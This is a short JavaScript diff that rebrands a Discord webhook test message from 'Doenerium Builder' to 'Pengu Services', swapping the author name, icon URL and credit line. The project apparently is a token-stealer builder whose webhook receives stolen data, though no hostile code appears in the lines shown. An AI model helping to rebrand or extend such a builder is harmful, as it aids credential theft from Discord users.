@@ -20,12 +20,12 @@ document.addEventListener('DOMContentLoaded', () => {
         const testEmbed = {
             title: '**Your Webhook Works Perfectly ✅**',
             author: {
-                name: 'Doenerium Builder',
-                icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1191516185573990430/948405394433253416201.png'
+                name: 'Pengu Services',
+                icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&'
             },
             color: 0x303037,
             footer: {
-                text: 't.me/doenerium69 | Made by @WallGod69',
+                text: 'Made by @pengu012',
             },
         };
 
